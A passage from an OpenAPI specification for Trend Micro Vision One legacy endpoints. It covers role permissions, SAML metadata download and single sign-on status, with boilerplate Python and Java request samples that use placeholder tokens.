            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/roles'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/roles\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/roles/{role}/permissions": {
      "get": {
        "tags": [
          "Roles (Legacy)"
        ],
        "summary": "Get permissions of a specific role",
        "description": "Retrieves the permissions of the specified role in Trend Vision One\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n",
        "parameters": [
          {
            "name": "role",
            "in": "path",
            "description": "The parameter should be url encoded.",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    },
                    "data": {
                      "required": [
                        "permissions"
                      ],
                      "type": "object",
                      "properties": {
                        "permissions": {
                          "type": "object",
                          "description": "Indicate whether the user account with this role has permission to access the api. \n* 0 - No access \n* 1 - Full access",
                          "additionalProperties": {
                            "type": "object",
                            "additionalProperties": {
                              "oneOf": [
                                {
                                  "type": "integer"
                                },
                                {
                                  "type": "object",
                                  "additionalProperties": {
                                    "type": "integer"
                                  }
                                }
                              ]
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/roles/{role}/permissions'\nurl_path = url_path.format(**{'role': 'YOUR_ROLE'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/roles/{role}/permissions\";\n        urlPath = urlPath.replace(\"{role}\", \"YOUR_ROLE\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/roles/permissions": {
      "get": {
        "tags": [
          "Roles (Legacy)"
        ],
        "summary": "Get permissions of all roles",
        "description": "Retrieves the permissions of all roles in Trend Vision One\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    },
                    "data": {
                      "type": "array",
                      "items": {
                        "required": [
                          "permissions",
                          "role"
                        ],
                        "type": "object",
                        "properties": {
                          "role": {
                            "type": "string"
                          },
                          "permissions": {
                            "type": "object",
                            "description": "Indicate whether the user account with this role has permission to access the api. \n* 0 - No access \n* 1 - Full access",
                            "additionalProperties": {
                              "type": "object",
                              "additionalProperties": {
                                "oneOf": [
                                  {
                                    "type": "integer"
                                  },
                                  {
                                    "type": "object",
                                    "additionalProperties": {
                                      "type": "integer"
                                    }
                                  }
                                ]
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/roles/permissions'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/roles/permissions\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/metadata/xdrSpMetadata.xml": {
      "get": {
        "tags": [
          "SAML"
        ],
        "summary": "Download Trend Micro XDR service provider (SP) metadata file",
        "description": "Downloads the Trend Micro XDR service provider (SP) metadata file required for SAML 2.0 single sign-on configuration\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Single Sign-On</b><br>\n  <ul>\n    <li>Manage metadata files</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "type": "string"
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/metadata/xdrSpMetadata.xml'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/metadata/xdrSpMetadata.xml\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/metadata/status": {
      "get": {
        "tags": [
          "SAML"
        ],
        "summary": "Get single sign-on status",
        "description": "Retrieves the status (enabled or disabled) of single sign-on for SAML accounts\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Single Sign-On</b><br>\n  <ul>\n    <li>Manage metadata files</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    },
                    "data": {
                      "required": [
                        "enabled"
                      ],
                      "type": "object",
                      "properties": {
                        "enabled": {
                          "type": "boolean"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/metadata/status'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/metadata/status\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "put": {
        "tags": [
          "SAML"
        ],
        "summary": "Enable or disable single sign-on",
        "description": "Enables or disables single sign-on for SAML accounts\n\nNote: This feature is not available for customers that signed up for or expressly updated Trend Vision One after July 3, 2023.\n\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Single Sign-On</b><br>\n  <ul>\n    <li>Manage metadata files</li>\n    <li>Enable/Disable SAML</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "*/*": {
              "schema": {
                "title": "empty object",
                "required": [
                  "enabled"
                ],
                "type": "object",
                "properties": {
                  "enabled": {
                    "type": "boolean"
                  }
                }
              }
            }
          },
          "required": false
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "data": {
                      "type": "object",
                      "properties": {
                        "enabled": {
                          "type": "boolean"
                        }
                      }
                    },
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-codegen-request-body-name": "root",
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/metadata/status'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'enabled': 'YOUR_ENABLED (boolean)'\n}\n\nr = requests.put(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
